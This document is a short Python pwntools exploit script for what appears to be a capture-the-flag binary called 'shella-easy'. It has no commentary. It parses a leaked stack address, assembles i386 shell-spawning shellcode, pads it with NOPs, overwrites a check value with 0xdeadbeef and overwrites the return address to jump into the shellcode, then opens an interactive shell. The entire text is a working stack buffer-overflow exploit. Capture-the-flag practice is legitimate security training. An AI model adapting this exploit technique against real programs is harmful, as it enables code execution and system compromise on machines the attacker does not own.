from pwn import *

p = process(['./shella-easy'])

context.arch = 'i386'
# context.log_level = 'debug'

p.recvuntil(b"a ")
stack = int(p.recvuntil(b" ",drop=True),16)

print(hex(stack))

shellcode = asm(shellcraft.i386.linux.sh())

payload = shellcode
payload += b"\x90"*(64-(len(shellcode)))
payload += p32(0xdeadbeef)
payload += b"A"*8
payload += p32(stack)

with open("payload","wb") as f:
    f.write(payload)

# gdb.attach(p)

p.sendline(payload)

p.interactive()
